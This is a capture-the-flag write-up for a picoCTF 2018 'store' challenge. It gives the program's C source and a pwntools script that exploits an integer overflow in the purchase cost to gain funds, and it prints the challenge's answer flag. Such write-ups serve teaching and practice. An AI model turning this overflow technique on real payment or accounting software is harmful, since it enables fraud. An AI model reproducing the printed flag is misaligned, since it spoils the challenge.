# Problem
We started a little [store](https://2018shell1.picoctf.com/static/5f775969757dd025afe50827eb9db223/store), can you buy the flag? [Source](https://2018shell1.picoctf.com/static/5f775969757dd025afe50827eb9db223/source.c). Connect with ```2018shell1.picoctf.com 53220```.

## Hints:
Two's compliment can do some weird things when numbers get really big!

## Solution:

First, we download the files and try to execute
```bash
wget https://2018shell1.picoctf.com/static/5f775969757dd025afe50827eb9db223/store
wget https://2018shell1.picoctf.com/static/5f775969757dd025afe50827eb9db223/source.c
chmod +x ./store
./store

Welcome to the Store App V1.0
World's Most Secure Purchasing App

[1] Check Account Balance

[2] Buy Stuff

[3] Exit

 Enter a menu selection
```

Lets look at the source:
```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    int con;
    con = 0;
    int account_balance = 1100;
    while(con == 0){
        
        printf("Welcome to the Store App V1.0\n");
        printf("World's Most Secure Purchasing App\n");

        printf("\n[1] Check Account Balance\n");
        printf("\n[2] Buy Stuff\n");
        printf("\n[3] Exit\n");
        int menu;
        printf("\n Enter a menu selection\n");
        fflush(stdin);
        scanf("%d", &menu);
        if(menu == 1){
            printf("\n\n\n Balance: %d \n\n\n", account_balance);
        }
        else if(menu == 2){
            printf("Current Auctions\n");
            printf("[1] I Can't Believe its not a Flag!\n");
            printf("[2] Real Flag\n");
            int auction_choice;
            fflush(stdin);
            scanf("%d", &auction_choice);
            if(auction_choice == 1){
                printf("Imitation Flags cost 1000 each, how many would you like?\n");
                
                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 1000*number_flags;
                    printf("\nYour total cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour new balance: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds\n");
                    }
                                    
                    
                }
                    
                    
                    
                
            }
            else if(auction_choice == 2){
                printf("A genuine Flag costs 100000 dollars, and we only have 1 in stock\n");
                printf("Enter 1 to purchase");
                int bid = 0;
                fflush(stdin);
                scanf("%d", &bid);
                
                if(bid == 1){
                    
                    if(account_balance > 100000){
                        printf("YOUR FLAG IS:\n");
                        }
                    
                    else{
                        printf("\nNot enough funds for transaction\n\n\n");
                    }}

            }
        }
        else{
            con = 1;
        }

    }
    return 0;
}
```

Lets try to understand. We can see out balance, and buy fake/real flags. fake costs 1000 and real costs 100000. We need the real flag.

There is a integer overflow that we can use.
If we buy many (```(2**31 + 100000) / 1000```) fake flags, the cost will become nagative and we will earn money. Then we can buy the real flag.

```python
#!/usr/bin/env python

from pwn import *
from time import sleep

debug = 1

user = 'roeesefi'
pw = '123123'


if debug == 1:
  p = process('./store')
else:
  p = remote('2018shell1.picoctf.com', 53220)

# Buy fake flags
print p.recvuntil(' Enter a menu selection')
p.sendline('2')
p.sendline('1')
p.sendline('2147684')

# Check balance
p.sendline('1')
print p.recvuntil(' Enter a menu selection')

# Buy original flag
p.sendline('2')
p.sendline('2')
p.sendline('1')

# Exit
p.sendline('3')
print p.recvall()
```

**The most funny this is that the flag isn't being read from a file, it is hard coded in the binary.**

**Strings could solve this as well :)**

Flag: picoCTF{numb3r3_4r3nt_s4f3_cbb7151f}